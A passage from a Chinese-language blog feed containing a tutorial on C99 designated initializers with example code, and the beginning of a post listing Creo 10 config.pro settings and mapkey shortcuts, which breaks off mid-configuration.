href="http://books.gigatux.nl/mirror/cinanutshell/0596006977/cinanut-CHP-5-SECT-1.html">http://books.gigatux.nl/mirror/cinanutshell/0596006977/cinanut-CHP-5-SECT-1.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>c-faq</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于标识初始器</title>
    <link href="/2024/04/18/%E5%85%B3%E4%BA%8E%E6%A0%87%E8%AF%86%E5%88%9D%E5%A7%8B%E5%99%A8/"/>
    <url>/2024/04/18/%E5%85%B3%E4%BA%8E%E6%A0%87%E8%AF%86%E5%88%9D%E5%A7%8B%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>在阅读 kernel 源码的时候，经常会碰到类似的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">test</span> <span class="hljs-title">p</span>=</span> &#123;<br>.initial=<span class="hljs-number">3</span>,<br>.ptr=xx,<span class="hljs-comment">//特别注意这里是使用,而不是;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>好像有点陌生吧，这是什么写法？ 这其实是 <code>C99</code> 新增的内容，叫做 <code>designated initializer</code> ，暂且翻译为 <strong>标识初始器</strong>吧！ 在 <code>C90</code> 之前，当你初始化一个数组，结构体或者联合体 (union) 的时候，你必须按照之前定义的顺序来初始化，且中间还不能跳跃。 这在 <code>C99</code> 之后，就已经打破了。</p><p>当我们初始化一个数组的时候， C90 之前，我们只能这样初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>C99</code> 中，你可以用 <code>‘[index]’</code> 的方式来指定初始化某个元素，其他没有明确初始化的元素，会按照默认值来初始化，所以我们可以这样来做：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">6</span>]=&#123; [<span class="hljs-number">2</span>] = <span class="hljs-number">4</span>, [<span class="hljs-number">5</span>] = <span class="hljs-number">8</span> &#125;;<br></code></pre></td></tr></table></figure><p>就相当于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>&#125;;<br></code></pre></td></tr></table></figure><p>当我们的数组很大的时候，你还可以这样来初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[]=&#123;[<span class="hljs-number">0</span> ... <span class="hljs-number">9</span>] = <span class="hljs-number">1</span>, [<span class="hljs-number">55</span> ... <span class="hljs-number">99</span>] = <span class="hljs-number">4</span>, [<span class="hljs-number">100</span>]=<span class="hljs-number">23</span>&#125;;<br></code></pre></td></tr></table></figure><p>注意：… 左右需要有空格，否则编译报错 甚至，我们可以和以前的初始化的方式，混合来写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">6</span>]=&#123;[<span class="hljs-number">1</span>]=<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,[<span class="hljs-number">4</span>]=<span class="hljs-number">7</span>&#125;;<br></code></pre></td></tr></table></figure><p>这里 <code>5</code> 对应于第 <code>3</code> 个元素</p><p>而在结构体的初始化中，我们可以这么干： 假如有一个这样的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> &#123;</span><br><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span> y;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们初始化它的一个实例的时候，在 C99 中，可以这样来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p1</span>=</span>&#123;.y=<span class="hljs-number">3</span>, .x=<span class="hljs-number">6</span>&#125;;<br></code></pre></td></tr></table></figure><p>注意，顺序和之前定义的是不同的哦，这就相当于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p1</span>=</span>&#123;<span class="hljs-number">6</span>,<span class="hljs-number">3</span>&#125;;<br></code></pre></td></tr></table></figure><p>还有一种写法是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p1</span>=</span>&#123;y:<span class="hljs-number">3</span>, x:<span class="hljs-number">6</span>&#125;;<br></code></pre></td></tr></table></figure><p>这是一种老式的写法，在 <code>gcc 2.5</code> 之后，就废弃了，不过，你这么用的话，编译器也不会报错，向后兼容嘛 如果是结构体数组呢，该怎样写？那就混合着来呗：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">parray</span>[10]=</span>&#123;[<span class="hljs-number">0</span>].y=<span class="hljs-number">4</span>,[<span class="hljs-number">0</span>].x=<span class="hljs-number">1</span>,[<span class="hljs-number">4</span>].x=<span class="hljs-number">6</span>&#125;;<br></code></pre></td></tr></table></figure><p>这是在结构体，在联合体中，照样可以这么用， 假设有这样一个联合体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">foo</span>&#123;</span> <span class="hljs-type">int</span> x; <span class="hljs-type">double</span> y;&#125;;<br></code></pre></td></tr></table></figure><p>在初始化的时候，可以这样做：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">foo</span> <span class="hljs-title">f</span>=</span>&#123;.y=<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>说这么多，可能有点迷糊了，那就做一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> &#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">6</span>]=&#123; [<span class="hljs-number">4</span>]=<span class="hljs-number">29</span>, [<span class="hljs-number">2</span>]=<span class="hljs-number">15</span>&#125;;<br>    <span class="hljs-type">int</span> widths[]=&#123; [<span class="hljs-number">0</span> ... <span class="hljs-number">9</span>]=<span class="hljs-number">1</span>, [<span class="hljs-number">10</span> ... <span class="hljs-number">99</span>]=<span class="hljs-number">2</span>, [<span class="hljs-number">100</span>]=<span class="hljs-number">3</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p1</span>=</span>&#123;.x=<span class="hljs-number">23</span>, .y=<span class="hljs-number">55</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p2</span>=</span>&#123;x:<span class="hljs-number">43</span>, y:<span class="hljs-number">12</span>&#125;;<br>    <span class="hljs-type">int</span> b[<span class="hljs-number">6</span>]=&#123; [<span class="hljs-number">1</span>]=<span class="hljs-number">23</span>,<span class="hljs-number">44</span>,[<span class="hljs-number">4</span>]=<span class="hljs-number">11</span>&#125;;<br>    <span class="hljs-comment">// struct point parray[10]=&#123;[2].y=33, [2].x=88, [0].x=20, [0].y:66&#125;;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 <code>gcc</code> 编译，可以通过编译，但同时也发现一个问题。 <code>gcc</code> 默认是按照 c89,<code>c90</code> 的标准来编译程序的，</p><p>但是这个程序没有加 <code>-std=c99</code> ，也能通过编译， WHY ？</p><p>其实虽然标识初始器是 <code>C99</code> 的标准，但是现在的 <code>gcc</code> 已经允许在 <code>c90</code> 的标准中出现这种写法。</p><p><strong>实际上，上面提到的那种写法只是 <code>GCC</code>编译器的一个扩展语法，所以在其他编译器使用的时候可能会报错。所以最好不要使用某类编译器的扩展语法</strong>。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://tinylab.org/c-faq2-10-designated-initializer/">来源</a></li><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Designated-Inits.html">GCC手册</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Creo10配置总结</title>
    <link href="/2024/04/18/Creo10%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93/"/>
    <url>/2024/04/18/Creo10%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>记载Creo10的配置</p><span id="more"></span>:<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于Creo10的配置项较多，因此本文将对Creo10的配置进行总结。需要注意的是, <code>Creo10</code>的配置可以使用图形配置, 但是仍然可以将在<code>config.pro</code>文件中进行配置。</p><p>在<code>config.pro</code>文件中, 主要是进行快捷键的映射配置. 总的来说, 你可以在<code>config.pro</code>文件中配置软件.</p><h1 id="原本快捷键"><a href="#原本快捷键" class="headerlink" title="原本快捷键"></a>原本快捷键</h1><ul><li>回到初始视角：<code>CTRL + D</code></li></ul><h1 id="我的Creo10配置"><a href="#我的Creo10配置" class="headerlink" title="我的Creo10配置"></a>我的Creo10配置</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">drawing_setup_file $PRO_DIRECTORY\text\prodetail.dtl<br>format_setup_file $PRO_DIRECTORY\text\prodetail.dtl<br>pro_unit_length unit_mm<br>pro_unit_mass unit_gram<br>template_designasm $PRO_DIRECTORY\templates\inlbs_asm_design_abs.asm<br>template_new_ecadasm $PRO_DIRECTORY\templates\inlbs_ecad_asm_abs.asm<br>template_drawing $PRO_DIRECTORY\templates\c_drawing.drw<br>template_sheetmetalpart $PRO_DIRECTORY\templates\inlbs_part_sheetmetal_abs.prt<br>template_solidpart $PRO_DIRECTORY\templates\inlbs_part_solid_abs.prt<br>template_boardpart $PRO_DIRECTORY\templates\inlbs_ecad_board_abs.prt<br><span class="hljs-built_in">todays_date_note_format %</span>Mmm-%dd-%yy<br>tolerance_standard ansi<br>weld_ui_standard ansi<br>search_path_file $CREO_COMMON_FILES\ifx\parts\prolibrary\search.pro<br><span class="hljs-title">des_exp_folder C:</span>\Users\Public\Documents<br>sketcher_starts_in_2d yes<br>mapkey sk @MAPKEY_LABEL草绘<span class="hljs-comment">;~ Command `ProCmdDatumSketCurve` ;\</span><br>mapkey(continued) ~ Move `Odui_Dlg_00` `Odui_Dlg_00` <span class="hljs-number">2</span> <span class="hljs-number">19.652004</span> <span class="hljs-number">6.952102</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `Odui_Dlg_00` `t1.PlnMru` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">; ``;</span><br>mapkey ex @MAPKEY_LABEL拉伸<span class="hljs-comment">;~ Command `ProCmdFtExtrude` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.extrev_1_placement.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `extrev_1_placement.<span class="hljs-number">0.0</span>` `PH.section_select_list` 